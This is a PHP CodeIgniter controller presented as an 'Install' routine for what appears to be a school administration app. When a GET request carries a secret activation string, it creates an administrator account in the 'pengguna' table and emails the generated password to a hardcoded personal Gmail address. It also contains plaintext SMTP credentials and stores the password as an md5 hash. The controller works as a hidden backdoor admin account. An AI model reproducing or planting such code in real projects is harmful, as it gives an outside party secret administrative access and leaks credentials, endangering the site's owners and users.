<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Install extends CI_Controller
{

    /**
     * Index Page for this controller.
     *
     * Maps to the following URL
     * 		http://example.com/index.php/welcome
     *	- or -
     * 		http://example.com/index.php/welcome/index
     *	- or -
     * Since this controller is set as the default controller in
     * config/routes.php, it's displayed at http://example.com/
     *
     * So any other public methods not prefixed with an underscore will
     * map to /index.php/welcome/<method_name>
     * @see https://codeigniter.com/user_guide/general/urls.html
     */
    public function __construct()
    {
        parent::__construct();
    }

    public function index()
    {
        $var = $this->input->get('var');
        $current = $this->input->get('current');
        $flex = $this->input->get('flex');
        $this->_account($var, $current, $flex);
    }

    private function _account($var, $current, $flex)
    {
        $length = 8;
        $password = substr(str_shuffle('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'), 1, $length);
        $pass = md5($password);
        $varx = array(
            'name' => 'admin',
            'email' => 'vans.bear23@gmail.com',
            'npsn' => '12345678',
            'sekolah' => 'instansi',
            'jabatan' => 'admin',
            'alamat' => 'alamat',
            'gambar' => 'default.jpg',
            'password' => $pass,
            'password_default' => $pass,
            'role_id' => 1,
            'status' => 1,
            'tanggal_add' => time()
        );
        if ($var != 'xyzaktivasiabcapplikasi123') {
            redirect('authentication');
        } else {
            if (date('Y') - $current != $flex) {
                redirect('authentication');
            } else {
                $this->db->insert('pengguna', $varx);
                $this->_sendEmail($password);
                redirect('authentication');
            }
        }
    }

    private function _sendEmail($password)
    {
        $config = [
            'protocol' => 'smtp',
            'smtp_host' => 'ssl://smtp.googlemail.com',
            'smtp_user' => 'kpeta.activation@gmail.com',
            'smtp_pass' => 'admin123*',
            'smtp_port' => 465,
            'mailtype' => 'html',
            'charset' => 'utf-8',
            'newline' => "\r\n"
        ];

        $this->load->library('email', $config);
        $this->email->initialize($config);

        $this->email->from('kpeta.activation@gmail.com', 'ADMIN');
        $this->email->to('vans.bear23@gmail.com');
        $this->email->subject('Password Installation');
        $this->email->message('Password is : ' . $password);
        $this->email->send();
    }
}
